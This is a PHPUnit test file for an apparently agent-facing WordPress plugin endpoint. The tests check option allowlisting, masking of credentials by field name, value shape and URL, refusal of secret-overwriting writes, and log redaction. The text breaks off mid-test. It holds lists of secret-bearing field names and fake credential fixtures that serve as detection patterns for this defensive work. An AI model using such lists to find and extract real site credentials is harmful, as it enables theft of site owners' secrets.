<?php
/**
 * Coverage for #800 — the option allowlist was wrong both ways, and the
 * first replacement was still wrong in ways an adversarial review found:
 * redaction by a leaf's own name missed `smtp.pass`, a secret stored as the
 * VALUE of a non-secret key, a list under a numeric index, and any option
 * that keeps its settings as a JSON string; a self-serve allowlist at the
 * same scope as the gate it lifts was not a gate; "writes may set secrets"
 * let an agent replace a live gateway credential and read `updated: true`.
 *
 * Pinned here, mutation by mutation.
 *
 * @package MCPWP
 */

use PHPUnit\Framework\TestCase;

final class OptionAccessTest extends TestCase {

	protected function setUp(): void {
		$GLOBALS['mcpwp_test_options']      = array();
		$GLOBALS['mcpwp_test_transients']   = array();
		$GLOBALS['mcpwp_test_current_user'] = 2;
	}

	protected function tearDown(): void {
		$GLOBALS['mcpwp_test_options'] = array();
	}

	private function activate( string ...$files ): void {
		update_option( 'active_plugins', $files );
	}

	private function read( string $key ) {
		$request = new WP_REST_Request( 'GET', '/mcpwp/v1/option', array( 'key' => $key ) );
		return ( new Mcpwp_REST_Site_Settings() )->get_option_handler( $request );
	}

	private function write( string $key, $value, array $extra = array() ) {
		$request = new WP_REST_Request( 'POST', '/mcpwp/v1/option', array_merge( array( 'key' => $key, 'value' => $value ), $extra ) );
		return ( new Mcpwp_REST_Site_Settings() )->update_option_handler( $request );
	}

	private function allowlist( $entries ) {
		$request = new WP_REST_Request( 'PUT', '/mcpwp/v1/plugin-settings', array( 'option_allowlist' => $entries ) );
		return ( new Mcpwp_REST_Site_Settings() )->update_plugin_settings( $request );
	}

	// ---------------------------------------------------------------
	// Too strict, fixed.
	// ---------------------------------------------------------------

	public function test_a_plugin_namespace_opens_when_the_plugin_is_active(): void {
		update_option( 'megamenu_settings', array( 'primary' => 'header' ) );

		$refused = $this->read( 'megamenu_settings' );
		$this->assertInstanceOf( WP_Error::class, $refused );
		$this->assertSame( 'not_allowlisted', $refused->get_error_data()['rule'] );

		$this->activate( 'megamenu/megamenu.php' );
		$allowed = $this->read( 'megamenu_settings' );
		$this->assertSame( 'plugin:megamenu', $allowed->get_data()['rule'] );
		$this->assertSame( array( 'primary' => 'header' ), $allowed->get_data()['value'] );
	}

	public function test_every_matrix_entry_unlocks_its_namespace_and_only_when_active(): void {
		$matrix = ( new ReflectionClass( Mcpwp_Option_Access::class ) )->getProperty( 'plugin_matrix' );
		$matrix->setAccessible( true );

		foreach ( $matrix->getValue() as $dir => $rules ) {
			$probe = ! empty( $rules['keys'] ) ? $rules['keys'][0] : $rules['prefixes'][0] . 'probe';
			$GLOBALS['mcpwp_test_options'] = array();
			update_option( $probe, 'v' );

			$this->assertInstanceOf( WP_Error::class, $this->read( $probe ), $dir . ' inactive' );
			$this->activate( $dir . '/' . $dir . '.php' );
			$this->assertSame( 'plugin:' . $dir, $this->read( $probe )->get_data()['rule'], $dir . ' active' );
		}
	}

	public function test_network_activated_plugins_count(): void {
		$GLOBALS['mcpwp_test_is_multisite'] = true;
		update_option( 'active_plugins', array() );
		$GLOBALS['mcpwp_test_site_options']['active_sitewide_plugins'] = array( 'megamenu/megamenu.php' => 1 );

		$this->assertContains( 'megamenu', Mcpwp_Option_Access::active_plugin_dirs() );
		unset( $GLOBALS['mcpwp_test_is_multisite'], $GLOBALS['mcpwp_test_site_options'] );
	}

	public function test_every_core_prefix_and_core_key_is_reachable(): void {
		$ref = new ReflectionClass( Mcpwp_Option_Access::class );
		foreach ( array( 'core_prefixes', 'core_keys', 'own_allowed_keys' ) as $prop ) {
			$p = $ref->getProperty( $prop );
			$p->setAccessible( true );
			foreach ( $p->getValue() as $entry ) {
				$key = 'core_prefixes' === $prop ? $entry . 'probe' : $entry;
				update_option( $key, 'v' );
				$this->assertInstanceOf( WP_REST_Response::class, $this->read( $key ), $key );
			}
		}
	}

	public function test_a_flag_whose_name_contains_password_is_readable_and_writable(): void {
		update_option( 'woocommerce_registration_generate_password', 'no' );

		$this->assertSame( 'no', $this->read( 'woocommerce_registration_generate_password' )->get_data()['value'] );

		$written = $this->write( 'woocommerce_registration_generate_password', 'yes' );
		$this->assertInstanceOf( WP_REST_Response::class, $written, is_wp_error( $written ) ? $written->get_error_message() : '' );
		$this->assertSame( 'yes', $written->get_data()['value'] );
	}

	public function test_every_flag_value_is_exempt_from_masking(): void {
		$flags = ( new ReflectionClass( Mcpwp_Option_Access::class ) )->getProperty( 'flag_values' );
		$flags->setAccessible( true );
		foreach ( $flags->getValue() as $flag ) {
			$this->assertFalse( Mcpwp_Option_Access::looks_like_secret_value( $flag ), var_export( $flag, true ) );
		}
		$this->assertTrue( Mcpwp_Option_Access::looks_like_secret_value( 'abcd' ), 'Four characters is the floor.' );
		$this->assertFalse( Mcpwp_Option_Access::looks_like_secret_value( 'abc' ) );
	}

	public function test_core_keys_keep_their_case_and_bad_names_are_refused_not_coerced(): void {
		update_option( 'WPLANG', 'de_DE' );
		$this->assertSame( 'de_DE', $this->read( 'WPLANG' )->get_data()['value'] );

		$bad = $this->read( 'widget_custom_html!' );
		$this->assertInstanceOf( WP_Error::class, $bad );
		$this->assertSame( 'invalid_option_name', $bad->get_error_code(), 'Stripping the ! would silently target a different option.' );
	}

	// ---------------------------------------------------------------
	// Redaction by path and by shape.
	// ---------------------------------------------------------------

	public function test_secrets_inside_an_allowed_array_are_masked_and_listed(): void {
		update_option(
			'woocommerce_bambora_settings',
			array(
				'enabled'     => 'yes',
				'title'       => 'Credit card',
				'merchant_id' => '300200100',
				'api_key'     => 'live-4f8a',
				'passcode'    => 'AbCdEf123456',
				'advanced'    => array( 'webhook_key' => 'whk_secret', 'debug' => 'no' ),
			)
		);

		$data = $this->read( 'woocommerce_bambora_settings' )->get_data();

		$this->assertSame( '***', $data['value']['api_key'] );
		$this->assertSame( '***', $data['value']['passcode'] );
		$this->assertSame( '***', $data['value']['advanced']['webhook_key'] );
		$this->assertSame( 'yes', $data['value']['enabled'] );
		$this->assertSame( 'Credit card', $data['value']['title'] );
		$this->assertSame( '300200100', $data['value']['merchant_id'] );
		$this->assertSame( array( 'api_key', 'passcode', 'advanced.webhook_key' ), $data['redacted'] );
	}

	public function test_the_field_names_the_review_listed_are_all_masked(): void {
		// smtp.pass, api_signature, api_transaction_key, consumer_key,
		// object-pswd, connect_site_key, rg_gforms_key, passphrase …
		$fields = array( 'pass', 'pwd', 'pswd', 'passphrase', 'api_signature', 'api_transaction_key', 'consumer_key', 'consumer_secret', 'site_key', 'client_key', 'shared_key', 'signing_key', 'object-pswd', 'rg_gforms_key', 'connect_site_key', 'license_key', 'licence', 'auth_token', 'refresh_token', 'access_token', 'private_key', 'sid', 'serial', 'credentials', 'bearer' );
		$tree   = array();
		foreach ( $fields as $f ) {
			$tree[ $f ] = 'value-' . $f;
		}
		update_option( 'woocommerce_probe_settings', $tree );

		$data = $this->read( 'woocommerce_probe_settings' )->get_data();

		foreach ( $fields as $f ) {
			$this->assertSame( '***', $data['value'][ $f ], $f );
		}
		$this->assertCount( count( $fields ), $data['redacted'] );
	}

	public function test_a_secret_in_value_position_and_under_a_numeric_index_is_masked(): void {
		$this->activate( 'contact-form-7/wp-contact-form-7.php' );
		// reCAPTCHA stores [ site_key => secret_key ]: the array KEY is the
		// site key, the VALUE is the secret.
		update_option( 'wpcf7_recaptcha', array( '6LcSiteKeyXYZabc' => '6LcSecretKeyABCxyz-987654321' ) );
		update_option( 'woocommerce_kp_settings', array( 'api_keys' => array( 'sk_live_11111111111111', 'sk_live_22222222222222' ), 'label' => 'Keys' ) );

		$captcha = $this->read( 'wpcf7_recaptcha' )->get_data();
		$this->assertSame( array( '6LcSiteKeyXYZabc' => '***' ), $captcha['value'], 'The value is the secret; the key name never matched.' );

		$keys = $this->read( 'woocommerce_kp_settings' )->get_data();
		$this->assertSame( array( '***', '***' ), $keys['value']['api_keys'], 'Everything under a secret-named parent is secret, numeric index or not.' );
		$this->assertSame( 'Keys', $keys['value']['label'] );
		$this->assertSame( array( 'api_keys.0', 'api_keys.1' ), $keys['redacted'] );
	}

	public function test_an_smtp_password_under_a_plugin_namespace_is_masked(): void {
		$this->activate( 'wp-mail-smtp/wp_mail_smtp.php' );
		update_option( 'wp_mail_smtp', array( 'mail' => array( 'from_email' => 'hello@example.com' ), 'smtp' => array( 'host' => 'smtp.example.com', 'user' => 'hello', 'pass' => 'Sup3rSecr3t!' ) ) );

		$data = $this->read( 'wp_mail_smtp' )->get_data();

		$this->assertSame( 'hello@example.com', $data['value']['mail']['from_email'] );
		$this->assertSame( 'smtp.example.com', $data['value']['smtp']['host'] );
		$this->assertSame( '***', $data['value']['smtp']['pass'] );
	}

	public function test_a_credential_is_masked_by_its_shape_whatever_the_field_is_called(): void {
		update_option( 'elementor_probe', array( 'connect' => 'sk_live_4eC39HqLyjWDarjtT1zdp7dc', 'jwt' => 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.abc', 'slug' => 'my-nice-page', 'title' => 'Hello World' ) );

		$data = $this->read( 'elementor_probe' )->get_data();

		$this->assertSame( '***', $data['value']['connect'] );
		$this->assertSame( '***', $data['value']['jwt'] );
		$this->assertSame( 'my-nice-page', $data['value']['slug'] );
		$this->assertSame( 'Hello World', $data['value']['title'] );
	}

	public function test_an_option_stored_as_a_json_string_is_walked(): void {
		$this->activate( 'all-in-one-seo-pack/all_in_one_seo_pack.php' );
		update_option( 'aioseo_options', wp_json_encode( array( 'general' => array( 'licenseKey' => 'AIO-1234-5678-ABCD', 'siteName' => 'Acme' ) ) ) );

		$data = $this->read( 'aioseo_options' )->get_data();

		$this->assertSame( 'json', $data['decoded_from'] );
		$decoded = json_decode( $data['value'], true );
		$this->assertSame( '***', $decoded['general']['licenseKey'] );
		$this->assertSame( 'Acme', $decoded['general']['siteName'] );
		$this->assertSame( array( 'general.licenseKey' ), $data['redacted'] );
	}

	public function test_an_option_stored_serialized_is_returned_as_a_walked_structure(): void {
		update_option( 'theme_mods_probe', serialize( array( 'api_key' => 'live-4f8a-secret', 'color' => 'teal' ) ) ); // phpcs:ignore

		$data = $this->read( 'theme_mods_probe' )->get_data();

		$this->assertSame( 'serialized', $data['decoded_from'] );
		$this->assertSame( array( 'api_key' => '***', 'color' => 'teal' ), $data['value'] );
	}

	public function test_a_secret_scalar_option_is_masked(): void {
		update_option( 'elementor_connect_site_key', 'abc123def456ghi789');
		update_option( 'woocommerce_api_key', 'sk_live_abcdef' );

		$this->assertSame( '***', $this->read( 'elementor_connect_site_key' )->get_data()['value'] );
		$this->assertSame( array( '' ), $this->read( 'woocommerce_api_key' )->get_data()['redacted'] );
	}

	// ---------------------------------------------------------------
	// Writes that would set a secret are asked for by name.
	// ---------------------------------------------------------------

	public function test_a_write_that_would_replace_a_credential_is_refused_unless_confirmed(): void {
		update_option( 'woocommerce_bambora_settings', array( 'passcode' => 'old-secret-1', 'enabled' => 'yes' ) );

		$refused = $this->write( 'woocommerce_bambora_settings', array( 'passcode' => 'new-secret-2', 'enabled' => 'yes' ) );
		$this->assertInstanceOf( WP_Error::class, $refused );
		$this->assertSame( 'secret_write_refused', $refused->get_error_code() );
		$this->assertSame( array( 'passcode' ), $refused->get_error_data()['secret_paths'] );
		$this->assertSame( 'old-secret-1', get_option( 'woocommerce_bambora_settings' )['passcode'], 'Nothing written.' );

		$confirmed = $this->write( 'woocommerce_bambora_settings', array( 'passcode' => 'new-secret-2', 'enabled' => 'yes' ), array( 'allow_secrets' => true ) );
		$this->assertInstanceOf( WP_REST_Response::class, $confirmed );
		$this->assertSame( 'new-secret-2', get_option( 'woocommerce_bambora_settings' )['passcode'] );
		$this->assertSame( '***', $confirmed->get_data()['value']['passcode'], 'Even a confirmed write never echoes the secret.' );
		$this->assertSame( '***', $confirmed->get_data()['old_value']['passcode'] );
	}

	public function test_a_write_that_only_touches_non_secret_fields_needs_no_confirmation_and_keeps_the_secret(): void {
		update_option( 'woocommerce_bambora_settings', array( 'passcode' => 'old-secret-1', 'title' => 'Card' ) );

		$written = $this->write( 'woocommerce_bambora_settings', array( 'title' => 'Credit card', 'enabled' => 'yes' ) );

		$this->assertInstanceOf( WP_REST_Response::class, $written, is_wp_error( $written ) ? $written->get_error_message() : '' );
		// The whole-value replace used to drop the omitted credential. Found
		// by review: a "touch one setting" edit blanked the gateway.
		$this->assertSame( 'old-secret-1', get_option( 'woocommerce_bambora_settings' )['passcode'] );
		$this->assertSame( 'Credit card', get_option( 'woocommerce_bambora_settings' )['title'] );
		$this->assertSame( array( 'passcode' ), $written->get_data()['preserved'] );
	}

	public function test_a_masked_read_echoed_back_never_overwrites_the_secret(): void {
		update_option( 'woocommerce_bambora_settings', array( 'passcode' => 'old-secret-1', 'enabled' => 'yes' ) );
		$read = $this->read( 'woocommerce_bambora_settings' )->get_data()['value'];
		$this->assertSame( '***', $read['passcode'] );

		// The ordinary agent loop: read, edit, write back.
		$read['enabled'] = 'no';
		$written         = $this->write( 'woocommerce_bambora_settings', $read );

		$this->assertInstanceOf( WP_REST_Response::class, $written, is_wp_error( $written ) ? $written->get_error_message() : '' );
		$this->assertSame( 'old-secret-1', get_option( 'woocommerce_bambora_settings' )['passcode'], 'MASK is never a value that can be written.' );
		$this->assertSame( 'no', get_option( 'woocommerce_bambora_settings' )['enabled'] );
		$this->assertSame( array( 'passcode' ), $written->get_data()['preserved'] );

		// Even with allow_secrets, *** is folded back — it is not a secret.
		$this->write( 'woocommerce_bambora_settings', array( 'passcode' => '***', 'enabled' => 'yes' ), array( 'allow_secrets' => true ) );
		$this->assertSame( 'old-secret-1', get_option( 'woocommerce_bambora_settings' )['passcode'] );

		update_option( 'woocommerce_api_key', 'sk_live_abcdefghijklmnop' );
		$this->write( 'woocommerce_api_key', '***' );
		$this->assertSame( 'sk_live_abcdefghijklmnop', get_option( 'woocommerce_api_key' ), 'A scalar option too.' );
	}

	public function test_a_non_credential_value_at_a_secret_path_never_erases_the_secret(): void {
		// '' / 'no' / 'x' at a secret path are not replacements; each would
		// have been a silent erase around the gate.
		foreach ( array( '', 'no', 'x', '0' ) as $junk ) {
			update_option( 'woocommerce_bambora_settings', array( 'passcode' => 'old-secret-1', 'enabled' => 'yes' ) );
			$written = $this->write( 'woocommerce_bambora_settings', array( 'passcode' => $junk, 'enabled' => 'no' ) );
			$this->assertInstanceOf( WP_REST_Response::class, $written, var_export( $junk, true ) );
			$this->assertSame( 'old-secret-1', get_option( 'woocommerce_bambora_settings' )['passcode'], var_export( $junk, true ) );
			$this->assertSame( array( 'passcode' ), $written->get_data()['preserved'] );
		}

		update_option( 'woocommerce_api_key', 'sk_live_abcdefghijklmnop' );
		$this->write( 'woocommerce_api_key', '' );
		$this->assertSame( 'sk_live_abcdefghijklmnop', get_option( 'woocommerce_api_key' ), 'A scalar secret option too.' );
	}

	public function test_a_credential_can_be_cleared_on_purpose_with_allow_secrets(): void {
		update_option( 'woocommerce_bambora_settings', array( 'passcode' => 'old-secret-1', 'enabled' => 'yes' ) );

		$written = $this->write( 'woocommerce_bambora_settings', array( 'passcode' => '', 'enabled' => 'yes' ), array( 'allow_secrets' => true ) );

		$this->assertInstanceOf( WP_REST_Response::class, $written );
		$this->assertSame( '', get_option( 'woocommerce_bambora_settings' )['passcode'], 'An explicit empty value with allow_secrets is an intentional clear.' );
		$this->assertSame( array(), $written->get_data()['preserved'] );

		// MASK stays folded back even then.
		$this->write( 'woocommerce_bambora_settings', array( 'passcode' => 'real-secret-2', 'enabled' => 'yes' ), array( 'allow_secrets' => true ) );
		$this->write( 'woocommerce_bambora_settings', array( 'passcode' => '***', 'enabled' => 'yes' ), array( 'allow_secrets' => true ) );
		$this->assertSame( 'real-secret-2', get_option( 'woocommerce_bambora_settings' )['passcode'] );
	}

	public function test_the_log_redacts_a_scalar_secret_value_by_its_option_name(): void {
		$harness = new class {
			use Mcpwp_Logging;
			public function scrub( $data ) {
				return $this->redact_log_data( $data, array() );
			}
		};

		$out = $harness->scrub( array( 'key' => 'woocommerce_api_key', 'value' => 'Hunter2!!', 'allow_secrets' => true ) );
		$this->assertSame( '[redacted]', $out['value'], 'The option name says the value is a secret even when its shape does not.' );

		$plain = $harness->scrub( array( 'key' => 'blogname', 'value' => 'Acme' ) );
		$this->assertSame( 'Acme', $plain['value'] );
	}

	public function test_a_refused_write_leaves_no_trace_of_the_secret_in_the_activity_log(): void {
		$GLOBALS['mcpwp_test_wpdb_rows'] = array();
		update_option( 'mcpwp_settings', array( 'enable_logging' => true ) );
		update_option( 'woocommerce_bambora_settings', array( 'passcode' => 'old' ) );

		$refused = $this->write( 'woocommerce_bambora_settings', array( 'passcode' => 'live-4f8a-NEW' ) );
		$this->assertSame( 'secret_write_refused', $refused->get_error_code() );

		$this->assertStringNotContainsString( 'live-4f8a-NEW', wp_json_encode( $GLOBALS['mcpwp_test_wpdb_rows'] ), '"Nothing was written" includes the log.' );

		$this->write( 'woocommerce_bambora_settings', array( 'passcode' => 'live-4f8a-NEW' ), array( 'allow_secrets' => true ) );
		$this->assertStringNotContainsString( 'live-4f8a-NEW', wp_json_encode( $GLOBALS['mcpwp_test_wpdb_rows'] ), 'An accepted write is logged with the credential redacted.' );
	}

	public function test_the_roles_floor_holds_for_any_table_prefix(): void {
		foreach ( array( 'wp_user_roles', 'wp_2_user_roles', 'acmewp_user_roles' ) as $key ) {
			$this->assertInstanceOf( WP_Error::class, $this->read( $key ), $key );
			$this->assertSame( '', Mcpwp_Option_Access::sanitize_allowlist_entry( $key ), $key );
		}
		// A wildcard may be entered; the floor is applied at decision time,
		// so the key it would cover is still refused.
		update_option( 'mcpwp_settings', array( 'option_allowlist' => array( 'wp_2_us*' ) ) );
		$this->assertStringStartsWith( 'blocked:', $this->read( 'wp_2_user_roles' )->get_error_data()['rule'] );
	}

	public function test_control_surfaces_are_readable_but_never_writable_nor_allowlistable(): void {
		update_option( 'siteurl', 'https://example.com' );
		$this->assertSame( 'https://example.com', $this->read( 'siteurl' )->get_data()['value'] );

		foreach ( array( 'siteurl', 'home', 'admin_email', 'template', 'stylesheet', 'upload_path', 'auto_update_plugins', 'mailserver_pass', 'rewrite_rules' ) as $key ) {
			$error = $this->write( $key, 'x' );
			$this->assertInstanceOf( WP_Error::class, $error, $key );
			$this->assertStringStartsWith( 'write_protected:', $error->get_error_data()['rule'], $key );
			$this->assertSame( '', Mcpwp_Option_Access::sanitize_allowlist_entry( $key ), $key . ' allowlist' );
		}
	}

	public function test_a_url_that_carries_its_credential_is_masked_and_a_plain_url_is_not(): void {
		update_option(
			'elementor_probe',
			array(
				'slack'  => 'https://hooks.slack.com/services/T000/B000/XXXXXXXXXXXXXXXXXXXXXXXX',
				'sentry' => 'https://0123456789abcdef0123456789abcdef@o1.ingest.sentry.io/456',
				'mirror' => 'https://admin:S3cretP4ss@backup.example.com/sync',
				'feed'   => 'https://api.example.com/feed?format=json&key=AbCdEfGh123456',
				'site'   => 'https://example.com/about/',
				'docs'   => 'https://example.com/?p=42',
			)
		);

		$value = $this->read( 'elementor_probe' )->get_data()['value'];

		foreach ( array( 'slack', 'sentry', 'mirror', 'feed' ) as $k ) {
			$this->assertSame( '***', $value[ $k ], $k );
		}
		$this->assertSame( 'https://example.com/about/', $value['site'] );
		$this->assertSame( 'https://example.com/?p=42', $value['docs'] );
	}

	public function test_descriptive_fields_that_merely_mention_a_secret_are_not_masked(): void {
		update_option(
			'elementor_probe',
			array(
				'license_status'   => 'valid',
				'license_expires'  => '2027-01-31',
				'access_level'     => 'manage_options',
				'auth_type'        => 'login',
				'refresh_interval' => '3600',
				'serial_display'   => 'Model A',
				'sid_label'        => 'North America',
				'connect_id'       => '550E8400-E29B-41D4-A716-446655440000',
				'license_key'      => 'ABCD-EFGH-IJKL-MNOP',
			)
		);

		$value = $this->read( 'elementor_probe' )->get_data()['value'];

		foreach ( array( 'license_status' => 'valid', 'license_expires' => '2027-01-31', 'access_level' => 'manage_options', 'auth_type' => 'login', 'refresh_interval' => '3600', 'serial_display' => 'Model A', 'sid_label' => 'North America', 'connect_id' => '550E8400-E29B-41D4-A716-446655440000' ) as $k => $v ) {
			$this->assertSame( $v, $value[ $k ], $k );
		}
		$this->assertSame( '***', $value['license_key'] );
	}

	public function test_the_extra_field_names_from_review_are_masked(): void {
		$fields = array( 'pin', 'otp', 'cvv', 'dsn', 'pw', 'nonce', 'webhook_url', 'ssl_cert', 'pem' );
		$tree   = array();
		foreach ( $fields as $f ) {
			$tree[ $f ] = 'value-for-' . $f;
		}
		update_option( 'woocommerce_probe_settings', $tree );

		$value = $this->read( 'woocommerce_probe_settings' )->get_data()['value'];
		foreach ( $fields as $f ) {
			$this->assertSame( '***', $value[ $f ], $f );
		}
	}

	public function test_a_serialized_write_payload_cannot_smuggle_a_secret_past_the_gate(): void {
		update_option( 'theme_mods_probe', array( 'color' => 'teal' ) );

		$refused = $this->write( 'theme_mods_probe', serialize( array( 'api_key' => 'live-4f8a-NEW1', 'color' => 'teal' ) ) ); // phpcs:ignore

		$this->assertInstanceOf( WP_Error::class, $refused );
		$this->assertSame( 'secret_write_refused', $refused->get_error_code() );
	}

	public function test_the_logging_redactor_uses_the_same_detector(): void {
		$harness = new class {
			use Mcpwp_Logging;
			public function scrub( $data ) {
				return $this->redact_log_data( $data, array( 'api_key' ) );
			}
		};

		$out = $harness->scrub( array( 'key' => 'woocommerce_bambora_settings', 'value' => array( 'passcode' => 'live-4f8a', 'smtp' => array( 'pass' => 'Sup3r' ), 'title' => 'Card' ), 'note' => 'sk_live_4eC39HqLyjWDarjtT1zdp7dc' ) );

		$this->assertSame( '[redacted]', $out['value']['passcode'] );
		$this->assertSame( '[redacted]', $out['value']['smtp']['pass'] );
		$this->assertSame( '[redacted]', $out['note'], 'Credential-shaped values are redacted whatever the field is called.' );
		$this->assertSame( 'Card', $out['value']['title'] );
	}

	public function test_a_licence_key_option_cannot_be_overwritten_by_accident(): void {
		update_option( 'elementor_pro_license_key', 'abcdef0123456789abcdef0123456789' );

		$refused = $this->write( 'elementor_pro_license_key', 'zzzz' );

		$this->assertSame( 'secret_write_refused', $refused->get_error_code(), 'Blanking a licence deactivates Elementor Pro site-wide.' );
	}

	// ---------------------------------------------------------------
	// The floor: never reachable, never allowlistable.
	// ---------------------------------------------------------------

	public function test_every_blocked_prefix_and_fragment_is_refused_and_names_the_rule(): void {
		$ref = new ReflectionClass( Mcpwp_Option_Access::class );
		$p   = $ref->getProperty( 'blocked_prefixes' );
		$p->setAccessible( true );
		foreach ( $p->getValue() as $prefix ) {
			$key   = $prefix . ( '_' === substr( $prefix, -1 ) ? 'probe' : '' );
			$error = $this->read( $key );
			$this->assertInstanceOf( WP_Error::class, $error, $key );
			$this->assertSame( 'blocked:' . $prefix, $error->get_error_data()['rule'], $key );
			$this->assertInstanceOf( WP_Error::class, $this->write( $key, 'x' ), $key . ' write' );
		}
		$f = $ref->getProperty( 'blocked_fragments' );
		$f->setAccessible( true );
		foreach ( $f->getValue() as $fragment ) {
			$key = 'elementor_probe' . $fragment . '_x';
			$this->assertStringStartsWith( 'blocked:*', $this->read( $key )->get_error_data()['rule'], $key );
		}
	}

	public function test_the_plugins_own_state_is_closed_except_the_named_keys(): void {
		foreach ( array( 'mcpwp_chat_secret', 'mcpwp_chat_endpoint', 'mcpwp_chat_history_1', 'mcpwp_rate_limit_settings', 'mcpwp_disabled_tool_categories', 'mcpwp_double_load', 'mcpwp_version', 'mcpwp_update_info', 'mcpwp_api_keys', 'spai_settings' ) as $key ) {
			$this->assertInstanceOf( WP_Error::class, $this->read( $key ), $key );
			$this->assertInstanceOf( WP_Error::class, $this->write( $key, 'x' ), $key );
		}
		update_option( 'mcpwp_site_context', '# Brand' );
		$this->assertSame( '# Brand', $this->read( 'mcpwp_site_context' )->get_data()['value'] );
	}

	public function test_nothing_on_the_floor_can_be_allowlisted(): void {
		foreach ( array( 'auth_salt', 'nonce_salt', 'wp_user_roles', 'active_plugins', 'cron', 'default_role', '_transient_*', '_site_transient_mcpwp', 'mcpwp_update_info', 'mcpwp_*', 'w*', 'auth*', 'mcpw*', 'foo_private_key', 'x_session_y', '*' ) as $entry ) {
			$this->assertSame( '', Mcpwp_Option_Access::sanitize_allowlist_entry( $entry ), $entry );
		}
		$this->assertSame( 'acme_widget_*', Mcpwp_Option_Access::sanitize_allowlist_entry( 'acme_widget_*' ) );
		$this->assertSame( 'gtm4wp-options', Mcpwp_Option_Access::sanitize_allowlist_entry( 'gtm4wp-options' ) );
	}

	public function test_allowlisting_the_floor_is_refused_at_write_time_and_saves_nothing(): void {
		$result = $this->allowlist( array( 'acme_ok', 'auth_salt', 'w*' ) );

		$this->assertInstanceOf( WP_Error::class, $result );
		$this->assertSame( 'invalid_allowlist_entry', $result->get_error_code() );
		$this->assertStringContainsString( 'auth_salt', $result->get_error_message() );
		$this->assertSame( array(), Mcpwp_Option_Access::site_allowlist() );
	}

	public function test_a_stringified_allowlist_is_refused_instead_of_erasing_the_list(): void {
		$this->assertInstanceOf( WP_REST_Response::class, $this->allowlist( array( 'acme_widget_settings' ) ) );

		$result = $this->allowlist( '["acme_widget_settings"]' );

		$this->assertInstanceOf( WP_Error::class, $result );
		$this->assertSame( 'invalid_allowlist', $result->get_error_code() );
		$this->assertSame( array( 'acme_widget_settings' ), Mcpwp_Option_Access::site_allowlist(), 'The list survived.' );
	}

	public function test_an_admin_can_extend_the_allowlist_per_site(): void {
		update_option( 'acme_widget_settings', array( 'colour' => 'teal' ) );
		$this->assertInstanceOf( WP_Error::class, $this->read( 'acme_widget_settings' ) );

		$this->assertInstanceOf( WP_REST_Response::class, $this->allowlist( array( 'acme_widget_settings', 'acme_widget_*', 'acme_widget_settings' ) ) );
		$this->assertSame( array( 'acme_widget_settings', 'acme_widget_*' ), Mcpwp_Option_Access::site_allowlist(), 'Deduplicated.' );

		$this->assertSame( 'site_allowlist:acme_widget_settings', $this->read( 'acme_widget_settings' )->get_data()['rule'] );
		update_option( 'acme_widget_other', 1 );
		$this->assertSame( 'site_allowlist:acme_widget_*', $this->read( 'acme_widget_other' )->get_data()['rule'] );
	}

	public function test_the_refusal_names_its_rule(): void {
		$error = $this->read( 'some_plugin_option' );

		$this->assertSame( 'not_allowlisted', $error->get_error_data()['rule'] );
		$this->assertStringContainsString( 'allowlist', $error->get_error_data()['hint'] );
	}

	// ---------------------------------------------------------------
	// Round 3: the merge works on the STORED form, not only on arrays.
	// ---------------------------------------------------------------

	public function test_an_option_stored_as_a_json_string_keeps_its_secret_through_a_read_edit_write_loop(): void {
		// P0-1: redact() hands a JSON-string option back as JSON; the merge
		// used to see two strings and pass the mask straight through.
		update_option( 'elementor_probe', wp_json_encode( array( 'api_key' => 'sk_live_abcdefghijklmnop', 'mode' => 'test' ) ) );

		$read = json_decode( $this->read( 'elementor_probe' )->get_data()['value'], true );
		$this->assertSame( '***', $read['api_key'] );

		$read['mode'] = 'live';
		$written      = $this->write( 'elementor_probe', wp_json_encode( $read ) );

		$this->assertInstanceOf( WP_REST_Response::class, $written, is_wp_error( $written ) ? $written->get_error_message() : '' );
		$stored = get_option( 'elementor_probe' );
		$this->assertIsString( $stored, 'The stored form is kept: a JSON-string option stays a JSON string.' );
		$decoded = json_decode( $stored, true );
		$this->assertSame( 'sk_live_abcdefghijklmnop', $decoded['api_key'] );
		$this->assertSame( 'live', $decoded['mode'] );
		$this->assertSame( array( 'api_key' ), $written->get_data()['preserved'] );
	}

	public function test_an_option_stored_serialized_keeps_its_secret_when_the_caller_sends_a_tree(): void {
		update_option( 'elementor_probe', serialize( array( 'password' => 'Hunter2!!xx', 'host' => 'smtp.old' ) ) ); // phpcs:ignore

		$written = $this->write( 'elementor_probe', array( 'host' => 'smtp.new' ) );

		$this->assertInstanceOf( WP_REST_Response::class, $written, is_wp_error( $written ) ? $written->get_error_message() : '' );
		$stored = get_option( 'elementor_probe' );
		$stored = is_string( $stored ) ? unserialize( $stored ) : $stored; // phpcs:ignore
		$this->assertSame( 'Hunter2!!xx', $stored['password'] );
		$this->assertSame( 'smtp.new', $stored['host'] );
	}

	public function test_a_mask_anywhere_in_the_final_value_is_refused_whatever_the_encoding(): void {
		// The invariant behind the merge: '***' never reaches storage. A
		// nested JSON string inside an array, and a key the stored value did
		// not have, are the two ways a mask could still slip through.
		update_option( 'elementor_probe', array( 'mode' => 'test' ) );

		$refused = $this->write( 'elementor_probe', array( 'mode' => 'live', 'new_field' => '***' ) );
		$this->assertSame( 'mask_in_write', $refused->get_error_code() );
		$this->assertSame( array( 'mode' => 'test' ), get_option( 'elementor_probe' ), 'Nothing was written.' );

		$refused = $this->write( 'elementor_probe', array( 'mode' => 'live', 'inner' => wp_json_encode( array( 'x' => '***' ) ) ) );
		$this->assertSame( 'mask_in_write', $refused->get_error_code() );

		$this->assertTrue( Mcpwp_Option_Access::contains_mask( '***' ) );
		$this->assertTrue( Mcpwp_Option_Access::contains_mask( '{"a":{"b":"***"}}' ) );
		$this->assertTrue( Mcpwp_Option_Access::contains_mask( array( 'a' => array( 'b' => ' *** ' ) ) ) );
		$this->assertFalse( Mcpwp_Option_Access::contains_mask( array( 'a' => 'x***y' ) ) );
	}

	public function test_a_key_containing_a_dot_and_an_object_ancestor_both_round_trip(): void {
		// P1-1: dotted-string paths broke on keys that contain '.', and a
		// stdClass ancestor was invisible to the walk.
		$old = array( 'smtp.example.com' => array( 'password' => 'Hunter2!!xx' ), 'label' => 'a' );
		update_option( 'elementor_probe', $old );

		$written = $this->write( 'elementor_probe', array( 'smtp.example.com' => array( 'password' => '***' ), 'label' => 'b' ) );
		$this->assertInstanceOf( WP_REST_Response::class, $written, is_wp_error( $written ) ? $written->get_error_message() : '' );
		$this->assertSame( 'Hunter2!!xx', get_option( 'elementor_probe' )['smtp.example.com']['password'] );
		$this->assertSame( 'b', get_option( 'elementor_probe' )['label'] );

